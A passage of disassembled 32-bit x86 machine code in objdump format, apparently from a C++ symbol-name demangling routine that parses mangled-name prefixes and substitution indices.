  402541:	80 38 24             	cmpb   $0x24,(%eax)
  402544:	0f 84 b6 00 00 00    	je     0x402600
  40254a:	83 f9 09             	cmp    $0x9,%ecx
  40254d:	7e 09                	jle    0x402558
  40254f:	81 7d 00 5f 47 4c 4f 	cmpl   $0x4f4c475f,0x0(%ebp)
  402556:	74 28                	je     0x402580
  402558:	89 ea                	mov    %ebp,%edx
  40255a:	89 d8                	mov    %ebx,%eax
  40255c:	e8 6f f6 ff ff       	call   0x401bd0
  402561:	89 43 28             	mov    %eax,0x28(%ebx)
  402564:	83 c4 04             	add    $0x4,%esp
  402567:	5b                   	pop    %ebx
  402568:	5e                   	pop    %esi
  402569:	5f                   	pop    %edi
  40256a:	5d                   	pop    %ebp
  40256b:	c3                   	ret
  40256c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402570:	83 c4 04             	add    $0x4,%esp
  402573:	31 c0                	xor    %eax,%eax
  402575:	5b                   	pop    %ebx
  402576:	5e                   	pop    %esi
  402577:	5f                   	pop    %edi
  402578:	5d                   	pop    %ebp
  402579:	c3                   	ret
  40257a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402580:	81 7d 04 42 41 4c 5f 	cmpl   $0x5f4c4142,0x4(%ebp)
  402587:	75 cf                	jne    0x402558
  402589:	0f b6 55 08          	movzbl 0x8(%ebp),%edx
  40258d:	80 fa 2e             	cmp    $0x2e,%dl
  402590:	88 54 24 03          	mov    %dl,0x3(%esp)
  402594:	0f 94 c0             	sete   %al
  402597:	80 fa 5f             	cmp    $0x5f,%dl
  40259a:	89 c6                	mov    %eax,%esi
  40259c:	0f 94 c0             	sete   %al
  40259f:	89 c7                	mov    %eax,%edi
  4025a1:	89 f0                	mov    %esi,%eax
  4025a3:	89 fa                	mov    %edi,%edx
  4025a5:	08 d0                	or     %dl,%al
  4025a7:	75 07                	jne    0x4025b0
  4025a9:	80 7c 24 03 24       	cmpb   $0x24,0x3(%esp)
  4025ae:	75 a8                	jne    0x402558
  4025b0:	80 7d 09 4e          	cmpb   $0x4e,0x9(%ebp)
  4025b4:	75 a2                	jne    0x402558
  4025b6:	8b 43 2c             	mov    0x2c(%ebx),%eax
  4025b9:	8b 53 14             	mov    0x14(%ebx),%edx
  4025bc:	83 c0 16             	add    $0x16,%eax
  4025bf:	29 c8                	sub    %ecx,%eax
  4025c1:	89 43 2c             	mov    %eax,0x2c(%ebx)
  4025c4:	3b 53 18             	cmp    0x18(%ebx),%edx
  4025c7:	7d 4f                	jge    0x402618
  4025c9:	8b 43 10             	mov    0x10(%ebx),%eax
  4025cc:	8d 0c 92             	lea    (%edx,%edx,4),%ecx
  4025cf:	83 c2 01             	add    $0x1,%edx
  4025d2:	89 53 14             	mov    %edx,0x14(%ebx)
  4025d5:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  4025d8:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  4025df:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  4025e6:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4025ec:	c7 40 0c c9 f6 42 00 	movl   $0x42f6c9,0xc(%eax)
  4025f3:	c7 40 10 15 00 00 00 	movl   $0x15,0x10(%eax)
  4025fa:	e9 62 ff ff ff       	jmp    0x402561
  4025ff:	90                   	nop
  402600:	83 c0 01             	add    $0x1,%eax
  402603:	89 43 0c             	mov    %eax,0xc(%ebx)
  402606:	83 f9 09             	cmp    $0x9,%ecx
  402609:	0f 8f 40 ff ff ff    	jg     0x40254f
  40260f:	e9 44 ff ff ff       	jmp    0x402558
  402614:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402618:	31 c0                	xor    %eax,%eax
  40261a:	e9 42 ff ff ff       	jmp    0x402561
  40261f:	90                   	nop
  402620:	55                   	push   %ebp
  402621:	57                   	push   %edi
  402622:	56                   	push   %esi
  402623:	53                   	push   %ebx
  402624:	89 c3                	mov    %eax,%ebx
  402626:	83 ec 0c             	sub    $0xc,%esp
  402629:	8b 40 0c             	mov    0xc(%eax),%eax
  40262c:	80 38 53             	cmpb   $0x53,(%eax)
  40262f:	75 5f                	jne    0x402690
  402631:	8d 48 01             	lea    0x1(%eax),%ecx
  402634:	89 4b 0c             	mov    %ecx,0xc(%ebx)
  402637:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  40263b:	84 c9                	test   %cl,%cl
  40263d:	75 61                	jne    0x4026a0
  40263f:	8b 43 08             	mov    0x8(%ebx),%eax
  402642:	83 e0 08             	and    $0x8,%eax
  402645:	0f 85 f5 00 00 00    	jne    0x402740
  40264b:	83 e2 01             	and    $0x1,%edx
  40264e:	0f 84 ec 00 00 00    	je     0x402740
  402654:	8b 43 0c             	mov    0xc(%ebx),%eax
  402657:	0f b6 00             	movzbl (%eax),%eax
  40265a:	83 e8 43             	sub    $0x43,%eax
  40265d:	3c 01                	cmp    $0x1,%al
  40265f:	0f 96 c2             	setbe  %dl
  402662:	b8 c0 01 43 00       	mov    $0x4301c0,%eax
  402667:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40266e:	66 90                	xchg   %ax,%ax
  402670:	38 08                	cmp    %cl,(%eax)
  402672:	0f 84 d8 00 00 00    	je     0x402750
  402678:	83 c0 1c             	add    $0x1c,%eax
  40267b:	3d 84 02 43 00       	cmp    $0x430284,%eax
  402680:	75 ee                	jne    0x402670
  402682:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402689:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402690:	31 f6                	xor    %esi,%esi
  402692:	83 c4 0c             	add    $0xc,%esp
  402695:	89 f0                	mov    %esi,%eax
  402697:	5b                   	pop    %ebx
  402698:	5e                   	pop    %esi
  402699:	5f                   	pop    %edi
  40269a:	5d                   	pop    %ebp
  40269b:	c3                   	ret
  40269c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4026a0:	8d 48 02             	lea    0x2(%eax),%ecx
  4026a3:	89 4b 0c             	mov    %ecx,0xc(%ebx)
  4026a6:	0f be 48 01          	movsbl 0x1(%eax),%ecx
  4026aa:	8d 41 d0             	lea    -0x30(%ecx),%eax
  4026ad:	3c 09                	cmp    $0x9,%al
  4026af:	77 1f                	ja     0x4026d0
  4026b1:	31 d2                	xor    %edx,%edx
  4026b3:	80 f9 5f             	cmp    $0x5f,%cl
  4026b6:	75 28                	jne    0x4026e0
  4026b8:	3b 53 20             	cmp    0x20(%ebx),%edx
  4026bb:	73 d3                	jae    0x402690
  4026bd:	8b 43 1c             	mov    0x1c(%ebx),%eax
  4026c0:	8b 34 90             	mov    (%eax,%edx,4),%esi
  4026c3:	83 c4 0c             	add    $0xc,%esp
  4026c6:	5b                   	pop    %ebx
  4026c7:	89 f0                	mov    %esi,%eax
  4026c9:	5e                   	pop    %esi
  4026ca:	5f                   	pop    %edi
  4026cb:	5d                   	pop    %ebp
  4026cc:	c3                   	ret
  4026cd:	8d 76 00             	lea    0x0(%esi),%esi
  4026d0:	80 f9 5f             	cmp    $0x5f,%cl
  4026d3:	74 dc                	je     0x4026b1
  4026d5:	8d 41 bf             	lea    -0x41(%ecx),%eax
  4026d8:	3c 19                	cmp    $0x19,%al
  4026da:	0f 87 5f ff ff ff    	ja     0x40263f
  4026e0:	31 c0                	xor    %eax,%eax
  4026e2:	eb 14                	jmp    0x4026f8
  4026e4:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4026e8:	8d 48 01             	lea    0x1(%eax),%ecx
  4026eb:	89 4b 0c             	mov    %ecx,0xc(%ebx)
  4026ee:	0f be 08             	movsbl (%eax),%ecx
  4026f1:	80 f9 5f             	cmp    $0x5f,%cl
  4026f4:	74 42                	je     0x402738
  4026f6:	89 d0                	mov    %edx,%eax
  4026f8:	8d 51 d0             	lea    -0x30(%ecx),%edx
  4026fb:	80 fa 09             	cmp    $0x9,%dl
  4026fe:	77 20                	ja     0x402720
  402700:	8d 14 c0             	lea    (%eax,%eax,8),%edx
  402703:	8d 54 91 d0          	lea    -0x30(%ecx,%edx,4),%edx
  402707:	39 c2                	cmp    %eax,%edx
  402709:	72 85                	jb     0x402690
  40270b:	8b 43 0c             	mov    0xc(%ebx),%eax
  40270e:	80 38 00             	cmpb   $0x0,(%eax)
  402711:	0f 84 79 ff ff ff    	je     0x402690
  402717:	eb cf                	jmp    0x4026e8
  402719:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402720:	8d 51 bf             	lea    -0x41(%ecx),%edx
  402723:	80 fa 19             	cmp    $0x19,%dl
  402726:	0f 87 64 ff ff ff    	ja     0x402690
  40272c:	8d 14 c0             	lea    (%eax,%eax,8),%edx
  40272f:	8d 54 91 c9          	lea    -0x37(%ecx,%edx,4),%edx
  402733:	eb d2                	jmp    0x402707
  402735:	8d 76 00             	lea    0x0(%esi),%esi
  402738:	83 c2 01             	add    $0x1,%edx
  40273b:	e9 78 ff ff ff       	jmp    0x4026b8
  402740:	c1 e8 03             	shr    $0x3,%eax
  402743:	89 c2                	mov    %eax,%edx
  402745:	83 e2 01             	and    $0x1,%edx
  402748:	e9 15 ff ff ff       	jmp    0x402662
  40274d:	8d 76 00             	lea    0x0(%esi),%esi
  402750:	8b 6b 18             	mov    0x18(%ebx),%ebp
  402753:	8b 70 14             	mov    0x14(%eax),%esi
  402756:	8b 4b 14             	mov    0x14(%ebx),%ecx
  402759:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40275d:	85 f6                	test   %esi,%esi
  40275f:	74 40                	je     0x4027a1
  402761:	8b 78 18             	mov    0x18(%eax),%edi
  402764:	89 7c 24 08          	mov    %edi,0x8(%esp)
  402768:	39 cd                	cmp    %ecx,%ebp
  40276a:	0f 8e ef 00 00 00    	jle    0x40285f
  402770:	8b 6b 10             	mov    0x10(%ebx),%ebp
  402773:	8d 3c 89             	lea    (%ecx,%ecx,4),%edi
  402776:	83 c1 01             	add    $0x1,%ecx
  402779:	8d 7c bd 00          	lea    0x0(%ebp,%edi,4),%edi
  40277d:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  402784:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  40278b:	89 4b 14             	mov    %ecx,0x14(%ebx)
  40278e:	89 77 0c             	mov    %esi,0xc(%edi)
  402791:	8b 74 24 08          	mov    0x8(%esp),%esi
  402795:	c7 07 18 00 00 00    	movl   $0x18,(%edi)
  40279b:	89 77 10             	mov    %esi,0x10(%edi)
  40279e:	89 7b 28             	mov    %edi,0x28(%ebx)
  4027a1:	84 d2                	test   %dl,%dl
  4027a3:	0f 84 a7 00 00 00    	je     0x402850
  4027a9:	8b 50 0c             	mov    0xc(%eax),%edx
  4027ac:	8b 40 10             	mov    0x10(%eax),%eax
  4027af:	8b 7c 24 04          	mov    0x4(%esp),%edi
  4027b3:	01 43 2c             	add    %eax,0x2c(%ebx)
  4027b6:	39 f9                	cmp    %edi,%ecx
  4027b8:	0f 8d 9d 00 00 00    	jge    0x40285b
  4027be:	8b 73 10             	mov    0x10(%ebx),%esi
  4027c1:	8d 3c 89             	lea    (%ecx,%ecx,4),%edi
  4027c4:	83 c1 01             	add    $0x1,%ecx
  4027c7:	8d 34 be             	lea    (%esi,%edi,4),%esi
  4027ca:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  4027d1:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  4027d8:	89 4b 14             	mov    %ecx,0x14(%ebx)
  4027db:	c7 06 18 00 00 00    	movl   $0x18,(%esi)
  4027e1:	89 56 0c             	mov    %edx,0xc(%esi)
  4027e4:	89 46 10             	mov    %eax,0x10(%esi)
  4027e7:	8b 43 0c             	mov    0xc(%ebx),%eax
  4027ea:	80 38 42             	cmpb   $0x42,(%eax)
  4027ed:	0f 85 9f fe ff ff    	jne    0x402692
  4027f3:	8b 7b 28             	mov    0x28(%ebx),%edi
  4027f6:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4027fd:	8d 76 00             	lea    0x0(%esi),%esi
  402800:	83 c0 01             	add    $0x1,%eax
  402803:	89 43 0c             	mov    %eax,0xc(%ebx)
  402806:	89 d8                	mov    %ebx,%eax
  402808:	e8 03 fd ff ff       	call   0x402510
  40280d:	89 f1                	mov    %esi,%ecx
  40280f:	ba 4e 00 00 00       	mov    $0x4e,%edx
  402814:	89 04 24             	mov    %eax,(%esp)
  402817:	89 d8                	mov    %ebx,%eax
  402819:	e8 a2 f2 ff ff       	call   0x401ac0
  40281e:	89 c6                	mov    %eax,%esi
  402820:	8b 43 0c             	mov    0xc(%ebx),%eax
  402823:	80 38 42             	cmpb   $0x42,(%eax)
  402826:	74 d8                	je     0x402800
  402828:	89 7b 28             	mov    %edi,0x28(%ebx)
  40282b:	85 f6                	test   %esi,%esi
  40282d:	0f 84 5d fe ff ff    	je     0x402690
  402833:	8b 43 20             	mov    0x20(%ebx),%eax
  402836:	3b 43 24             	cmp    0x24(%ebx),%eax
  402839:	0f 8d 51 fe ff ff    	jge    0x402690
  40283f:	8b 53 1c             	mov    0x1c(%ebx),%edx
  402842:	89 34 82             	mov    %esi,(%edx,%eax,4)
  402845:	83 c0 01             	add    $0x1,%eax
  402848:	89 43 20             	mov    %eax,0x20(%ebx)
  40284b:	e9 42 fe ff ff       	jmp    0x402692
  402850:	8b 50 04             	mov    0x4(%eax),%edx
  402853:	8b 40 08             	mov    0x8(%eax),%eax
  402856:	e9 54 ff ff ff       	jmp    0x4027af
  40285b:	31 f6                	xor    %esi,%esi
  40285d:	eb 88                	jmp    0x4027e7
  40285f:	31 ff                	xor    %edi,%edi
  402861:	e9 38 ff ff ff       	jmp    0x40279e
  402866:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40286d:	8d 76 00             	lea    0x0(%esi),%esi
  402870:	57                   	push   %edi
  402871:	56                   	push   %esi
  402872:	53                   	push   %ebx
  402873:	89 c3                	mov    %eax,%ebx
  402875:	83 ec 04             	sub    $0x4,%esp
  402878:	8b 40 0c             	mov    0xc(%eax),%eax
  40287b:	80 38 57             	cmpb   $0x57,(%eax)
  40287e:	75 68                	jne    0x4028e8
  402880:	89 d6                	mov    %edx,%esi
  402882:	eb 18                	jmp    0x40289c
  402884:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402888:	8b 4b 1c             	mov    0x1c(%ebx),%ecx
  40288b:	89 04 91             	mov    %eax,(%ecx,%edx,4)
  40288e:	8b 43 0c             	mov    0xc(%ebx),%eax
  402891:	83 c2 01             	add    $0x1,%edx
  402894:	89 53 20             	mov    %edx,0x20(%ebx)
  402897:	80 38 57             	cmpb   $0x57,(%eax)
  40289a:	75 4c                	jne    0x4028e8
  40289c:	8d 50 01             	lea    0x1(%eax),%edx
  40289f:	bf 55 00 00 00       	mov    $0x55,%edi
  4028a4:	89 53 0c             	mov    %edx,0xc(%ebx)
  4028a7:	80 78 01 50          	cmpb   $0x50,0x1(%eax)
  4028ab:	75 0b                	jne    0x4028b8
  4028ad:	83 c0 02             	add    $0x2,%eax
  4028b0:	bf 56 00 00 00       	mov    $0x56,%edi
  4028b5:	89 43 0c             	mov    %eax,0xc(%ebx)
  4028b8:	89 d8                	mov    %ebx,%eax
  4028ba:	e8 51 fc ff ff       	call   0x402510
  4028bf:	8b 0e                	mov    (%esi),%ecx
  4028c1:	89 fa                	mov    %edi,%edx
  4028c3:	89 04 24             	mov    %eax,(%esp)
  4028c6:	89 d8                	mov    %ebx,%eax
  4028c8:	e8 f3 f1 ff ff       	call   0x401ac0
  4028cd:	89 06                	mov    %eax,(%esi)
  4028cf:	85 c0                	test   %eax,%eax
  4028d1:	74 08                	je     0x4028db
  4028d3:	8b 53 20             	mov    0x20(%ebx),%edx
  4028d6:	3b 53 24             	cmp    0x24(%ebx),%edx
  4028d9:	7c ad                	jl     0x402888
  4028db:	83 c4 04             	add    $0x4,%esp
  4028de:	31 c0                	xor    %eax,%eax
  4028e0:	5b                   	pop    %ebx
  4028e1:	5e                   	pop    %esi
  4028e2:	5f                   	pop    %edi
  4028e3:	c3                   	ret
  4028e4:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4028e8:	83 c4 04             	add    $0x4,%esp
  4028eb:	b8 01 00 00 00       	mov    $0x1,%eax
  4028f0:	5b                   	pop    %ebx
  4028f1:	5e                   	pop    %esi
  4028f2:	5f                   	pop    %edi
  4028f3:	c3                   	ret
  4028f4:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4028fb:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4028ff:	90                   	nop
  402900:	55                   	push   %ebp
  402901:	57                   	push   %edi
  402902:	56                   	push   %esi
  402903:	53                   	push   %ebx
  402904:	89 c3                	mov    %eax,%ebx
  402906:	83 ec 3c             	sub    $0x3c,%esp
  402909:	8b 70 0c             	mov    0xc(%eax),%esi
  40290c:	89 f0                	mov    %esi,%eax
  40290e:	e8 9d f7 ff ff       	call   0x4020b0
  402913:	85 c0                	test   %eax,%eax
  402915:	75 29                	jne    0x402940
  402917:	0f be 06             	movsbl (%esi),%eax
  40291a:	3c 55                	cmp    $0x55,%al
  40291c:	0f 8f fe 00 00 00    	jg     0x402a20
  402922:	3c 40                	cmp    $0x40,%al
  402924:	0f 8e 76 01 00 00    	jle    0x402aa0
  40292a:	83 e8 41             	sub    $0x41,%eax
  40292d:	3c 14                	cmp    $0x14,%al
  40292f:	0f 87 6b 01 00 00    	ja     0x402aa0
  402935:	0f b6 c0             	movzbl %al,%eax
  402938:	ff 24 85 f4 f6 42 00 	jmp    *0x42f6f4(,%eax,4)
  40293f:	90                   	nop
  402940:	8d 54 24 24          	lea    0x24(%esp),%edx
  402944:	31 c9                	xor    %ecx,%ecx
  402946:	89 d8                	mov    %ebx,%eax
  402948:	e8 23 21 00 00       	call   0x404a70
  40294d:	89 c6                	mov    %eax,%esi
  40294f:	85 c0                	test   %eax,%eax
  402951:	0f 84 a9 00 00 00    	je     0x402a00
  402957:	8b 43 0c             	mov    0xc(%ebx),%eax
  40295a:	80 38 46             	cmpb   $0x46,(%eax)
  40295d:	89 d8                	mov    %ebx,%eax
  40295f:	0f 84 ab 00 00 00    	je     0x402a10
  402965:	e8 96 ff ff ff       	call   0x402900
  40296a:	89 06                	mov    %eax,(%esi)
  40296c:	85 c0                	test   %eax,%eax
  40296e:	0f 84 8c 00 00 00    	je     0x402a00
  402974:	8b 08                	mov    (%eax),%ecx
  402976:	8d 51 e1             	lea    -0x1f(%ecx),%edx
  402979:	83 fa 01             	cmp    $0x1,%edx
  40297c:	77 12                	ja     0x402990
  40297e:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  402982:	8b 50 0c             	mov    0xc(%eax),%edx
  402985:	89 48 0c             	mov    %ecx,0xc(%eax)
  402988:	8b 06                	mov    (%esi),%eax
  40298a:	89 44 24 24          	mov    %eax,0x24(%esp)
  40298e:	89 16                	mov    %edx,(%esi)
  402990:	8b 7c 24 24          	mov    0x24(%esp),%edi
  402994:	85 ff                	test   %edi,%edi
  402996:	74 68                	je     0x402a00
  402998:	8b 43 20             	mov    0x20(%ebx),%eax
  40299b:	3b 43 24             	cmp    0x24(%ebx),%eax
  40299e:	7d 60                	jge    0x402a00
  4029a0:	8b 53 1c             	mov    0x1c(%ebx),%edx
  4029a3:	89 3c 82             	mov    %edi,(%edx,%eax,4)
  4029a6:	83 c0 01             	add    $0x1,%eax
  4029a9:	89 43 20             	mov    %eax,0x20(%ebx)
  4029ac:	83 c4 3c             	add    $0x3c,%esp
  4029af:	89 f8                	mov    %edi,%eax
  4029b1:	5b                   	pop    %ebx
  4029b2:	5e                   	pop    %esi
  4029b3:	5f                   	pop    %edi
  4029b4:	5d                   	pop    %ebp
  4029b5:	c3                   	ret
  4029b6:	8b 73 30             	mov    0x30(%ebx),%esi
  4029b9:	c7 43 30 01 00 00 00 	movl   $0x1,0x30(%ebx)
  4029c0:	89 d8                	mov    %ebx,%eax
  4029c2:	e8 f9 18 00 00       	call   0x4042c0
  4029c7:	89 73 30             	mov    %esi,0x30(%ebx)
  4029ca:	ba 45 00 00 00       	mov    $0x45,%edx
  4029cf:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4029d6:	89 c1                	mov    %eax,%ecx
  4029d8:	89 d8                	mov    %ebx,%eax
  4029da:	e8 e1 f0 ff ff       	call   0x401ac0
  4029df:	89 44 24 24          	mov    %eax,0x24(%esp)
  4029e3:	89 c7                	mov    %eax,%edi
  4029e5:	85 c0                	test   %eax,%eax
  4029e7:	74 17                	je     0x402a00
  4029e9:	8b 43 0c             	mov    0xc(%ebx),%eax
  4029ec:	80 38 00             	cmpb   $0x0,(%eax)
  4029ef:	74 0f                	je     0x402a00
  4029f1:	8d 50 01             	lea    0x1(%eax),%edx
  4029f4:	89 53 0c             	mov    %edx,0xc(%ebx)
  4029f7:	80 38 45             	cmpb   $0x45,(%eax)
  4029fa:	74 78                	je     0x402a74
  4029fc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402a00:	31 ff                	xor    %edi,%edi
  402a02:	83 c4 3c             	add    $0x3c,%esp
  402a05:	89 f8                	mov    %edi,%eax
  402a07:	5b                   	pop    %ebx
  402a08:	5e                   	pop    %esi
  402a09:	5f                   	pop    %edi
  402a0a:	5d                   	pop    %ebp
  402a0b:	c3                   	ret
  402a0c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402a10:	e8 db 09 00 00       	call   0x4033f0
  402a15:	e9 50 ff ff ff       	jmp    0x40296a
  402a1a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402a20:	8d 48 9f             	lea    -0x61(%eax),%ecx
  402a23:	80 f9 19             	cmp    $0x19,%cl
  402a26:	77 78                	ja     0x402aa0
  402a28:	ba 01 00 00 00       	mov    $0x1,%edx
  402a2d:	d3 e2                	shl    %cl,%edx
  402a2f:	81 e2 ff 7b ec 03    	and    $0x3ec7bff,%edx
  402a35:	0f 85 0d 07 00 00    	jne    0x403148
  402a3b:	80 f9 14             	cmp    $0x14,%cl
  402a3e:	75 60                	jne    0x402aa0
  402a40:	83 c6 01             	add    $0x1,%esi
  402a43:	89 d8                	mov    %ebx,%eax
  402a45:	89 73 0c             	mov    %esi,0xc(%ebx)
  402a48:	e8 c3 fa ff ff       	call   0x402510
  402a4d:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402a54:	ba 29 00 00 00       	mov    $0x29,%edx
  402a59:	89 c1                	mov    %eax,%ecx
  402a5b:	89 d8                	mov    %ebx,%eax
  402a5d:	e8 5e f0 ff ff       	call   0x401ac0
  402a62:	89 44 24 24          	mov    %eax,0x24(%esp)
  402a66:	89 c7                	mov    %eax,%edi
  402a68:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402a6f:	90                   	nop
  402a70:	85 ff                	test   %edi,%edi
  402a72:	74 8c                	je     0x402a00
  402a74:	8b 43 20             	mov    0x20(%ebx),%eax
  402a77:	3b 43 24             	cmp    0x24(%ebx),%eax
  402a7a:	7d 84                	jge    0x402a00
  402a7c:	8b 53 1c             	mov    0x1c(%ebx),%edx
  402a7f:	89 3c 82             	mov    %edi,(%edx,%eax,4)
  402a82:	83 c0 01             	add    $0x1,%eax
  402a85:	8b 7c 24 24          	mov    0x24(%esp),%edi
  402a89:	89 43 20             	mov    %eax,0x20(%ebx)
  402a8c:	83 c4 3c             	add    $0x3c,%esp
  402a8f:	5b                   	pop    %ebx
  402a90:	89 f8                	mov    %edi,%eax
  402a92:	5e                   	pop    %esi
  402a93:	5f                   	pop    %edi
  402a94:	5d                   	pop    %ebp
  402a95:	c3                   	ret
  402a96:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402a9d:	8d 76 00             	lea    0x0(%esi),%esi
  402aa0:	83 c4 3c             	add    $0x3c,%esp
  402aa3:	89 d8                	mov    %ebx,%eax
  402aa5:	ba 01 00 00 00       	mov    $0x1,%edx
  402aaa:	5b                   	pop    %ebx
  402aab:	5e                   	pop    %esi
  402aac:	5f                   	pop    %edi
  402aad:	5d                   	pop    %ebp
  402aae:	e9 dd 28 00 00       	jmp    0x405390
  402ab3:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402ab7:	90                   	nop
  402ab8:	83 c6 01             	add    $0x1,%esi
  402abb:	89 d8                	mov    %ebx,%eax
  402abd:	89 73 0c             	mov    %esi,0xc(%ebx)
  402ac0:	e8 3b fe ff ff       	call   0x402900
  402ac5:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402acc:	ba 26 00 00 00       	mov    $0x26,%edx
  402ad1:	89 c1                	mov    %eax,%ecx
  402ad3:	89 d8                	mov    %ebx,%eax
  402ad5:	e8 e6 ef ff ff       	call   0x401ac0
  402ada:	89 44 24 24          	mov    %eax,0x24(%esp)
  402ade:	89 c7                	mov    %eax,%edi
  402ae0:	eb 8e                	jmp    0x402a70
  402ae2:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402ae8:	8d 46 01             	lea    0x1(%esi),%eax
  402aeb:	89 43 0c             	mov    %eax,0xc(%ebx)
  402aee:	80 7e 01 00          	cmpb   $0x0,0x1(%esi)
  402af2:	0f 84 08 ff ff ff    	je     0x402a00
  402af8:	8d 46 02             	lea    0x2(%esi),%eax
  402afb:	89 43 0c             	mov    %eax,0xc(%ebx)
  402afe:	0f b6 46 01          	movzbl 0x1(%esi),%eax
  402b02:	83 e8 46             	sub    $0x46,%eax
  402b05:	3c 30                	cmp    $0x30,%al
  402b07:	0f 87 f3 fe ff ff    	ja     0x402a00
  402b0d:	0f b6 c0             	movzbl %al,%eax
  402b10:	ff 24 85 48 f7 42 00 	jmp    *0x42f748(,%eax,4)
  402b17:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402b1e:	66 90                	xchg   %ax,%ax
  402b20:	89 d8                	mov    %ebx,%eax
  402b22:	e8 c9 08 00 00       	call   0x4033f0
  402b27:	89 44 24 24          	mov    %eax,0x24(%esp)
  402b2b:	89 c7                	mov    %eax,%edi
  402b2d:	e9 3e ff ff ff       	jmp    0x402a70
  402b32:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402b38:	83 c6 01             	add    $0x1,%esi
  402b3b:	89 d8                	mov    %ebx,%eax
  402b3d:	89 73 0c             	mov    %esi,0xc(%ebx)
  402b40:	e8 bb fd ff ff       	call   0x402900
  402b45:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402b4c:	ba 23 00 00 00       	mov    $0x23,%edx
  402b51:	89 c1                	mov    %eax,%ecx
  402b53:	89 d8                	mov    %ebx,%eax
  402b55:	e8 66 ef ff ff       	call   0x401ac0
  402b5a:	89 44 24 24          	mov    %eax,0x24(%esp)
  402b5e:	89 c7                	mov    %eax,%edi
  402b60:	e9 0b ff ff ff       	jmp    0x402a70
  402b65:	8d 76 00             	lea    0x0(%esi),%esi
  402b68:	83 c6 01             	add    $0x1,%esi
  402b6b:	89 d8                	mov    %ebx,%eax
  402b6d:	89 73 0c             	mov    %esi,0xc(%ebx)
  402b70:	e8 8b fd ff ff       	call   0x402900
  402b75:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402b7c:	ba 24 00 00 00       	mov    $0x24,%edx
  402b81:	89 c1                	mov    %eax,%ecx
  402b83:	89 d8                	mov    %ebx,%eax
  402b85:	e8 36 ef ff ff       	call   0x401ac0
  402b8a:	89 44 24 24          	mov    %eax,0x24(%esp)
  402b8e:	89 c7                	mov    %eax,%edi
  402b90:	e9 db fe ff ff       	jmp    0x402a70
  402b95:	8d 76 00             	lea    0x0(%esi),%esi
  402b98:	89 d8                	mov    %ebx,%eax
  402b9a:	e8 11 f8 ff ff       	call   0x4023b0
  402b9f:	8b 6b 0c             	mov    0xc(%ebx),%ebp
  402ba2:	89 44 24 24          	mov    %eax,0x24(%esp)
  402ba6:	89 c7                	mov    %eax,%edi
  402ba8:	80 7d 00 49          	cmpb   $0x49,0x0(%ebp)
  402bac:	0f 85 be fe ff ff    	jne    0x402a70
  402bb2:	8b 4b 34             	mov    0x34(%ebx),%ecx
  402bb5:	85 c9                	test   %ecx,%ecx
  402bb7:	0f 85 38 06 00 00    	jne    0x4031f5
  402bbd:	85 c0                	test   %eax,%eax
  402bbf:	0f 84 3b fe ff ff    	je     0x402a00
  402bc5:	8b 43 20             	mov    0x20(%ebx),%eax
  402bc8:	3b 43 24             	cmp    0x24(%ebx),%eax
  402bcb:	0f 8d 2f fe ff ff    	jge    0x402a00
  402bd1:	8b 73 1c             	mov    0x1c(%ebx),%esi
  402bd4:	89 3c 86             	mov    %edi,(%esi,%eax,4)
  402bd7:	83 c0 01             	add    $0x1,%eax
  402bda:	31 f6                	xor    %esi,%esi
  402bdc:	89 43 20             	mov    %eax,0x20(%ebx)
  402bdf:	0f b6 45 00          	movzbl 0x0(%ebp),%eax
  402be3:	83 e8 49             	sub    $0x49,%eax
  402be6:	3c 01                	cmp    $0x1,%al
  402be8:	77 0f                	ja     0x402bf9
  402bea:	8d 55 01             	lea    0x1(%ebp),%edx
  402bed:	89 d8                	mov    %ebx,%eax
  402bef:	89 53 0c             	mov    %edx,0xc(%ebx)
  402bf2:	e8 59 14 00 00       	call   0x404050
  402bf7:	89 c6                	mov    %eax,%esi
  402bf9:	89 34 24             	mov    %esi,(%esp)
  402bfc:	89 f9                	mov    %edi,%ecx
  402bfe:	ba 04 00 00 00       	mov    $0x4,%edx
  402c03:	89 d8                	mov    %ebx,%eax
  402c05:	e8 b6 ee ff ff       	call   0x401ac0
